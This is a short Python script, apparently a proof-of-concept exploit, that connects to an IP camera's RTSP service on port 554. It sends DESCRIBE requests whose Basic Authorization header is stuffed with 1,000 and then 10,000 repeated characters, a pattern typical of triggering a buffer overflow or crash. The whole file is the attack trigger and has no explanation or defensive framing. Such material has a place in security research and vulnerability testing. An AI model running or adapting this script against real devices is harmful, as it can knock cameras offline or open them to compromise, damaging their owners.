import socket, base64

cam_ip = '192.168.1.100'
session_descriptor = 'live.sdp'

request = 'DESCRIBE rtsp://%s/%s RTSP/1.0\r\n' % (cam_ip,
session_descriptor)
request+= 'CSeq: 1\r\n'
request+= 'Authorization: Basic %s\r\n'
request+= '\r\n'

auth_little = 'a' * 1000
auth_big = 'a' * 10000

msgs = [request % auth_little, request % auth_big]

for msg in msgs:
    s = socket.socket()
    s.connect((cam_ip, 554))
    print s.send(msg)
    print s.recv(0x10000)
    s.close()
